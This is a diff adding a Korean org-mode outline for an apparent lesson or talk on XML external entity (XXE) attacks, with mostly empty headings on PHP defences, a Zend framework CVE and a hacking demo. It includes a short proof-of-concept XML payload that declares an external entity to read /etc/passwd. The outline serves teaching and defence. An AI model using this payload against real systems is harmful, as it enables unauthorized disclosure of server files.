@@ -1,0 +1,28 @@
+* 개념
+
+* 샘플 해킹
+** 간단한 POC
+*** 테스트 문자열
+#+BEGIN_SRC xml
+<!DOCTYPE root
+[<!ENTITY foo "xml external entity">]>
+<test><testing>&foo;</testing></test>
+#+END_SRC
+*** 공격 문자열
+#+BEGIN_SRC xml
+<!DOCTYPE root
+[<!ENTITY foo SYSTEM "file:///etc/passwd">]>
+<test><testing>&foo;</testing></test>
+#+END_SRC
+
+** 일반적인 방어방법 in PHP
+
+* 실전 해킹
+** 관련 CVE
+** 해당 Zend 프레임웍
+** 방어코드 in PHP
+이렇게 방어가 되어있다는 것을 보여준다.
+** 정말 안뚫릴까? 해킹 시연
+** 왜 뚫렸는가?
+** 제대로 막으려면?
+
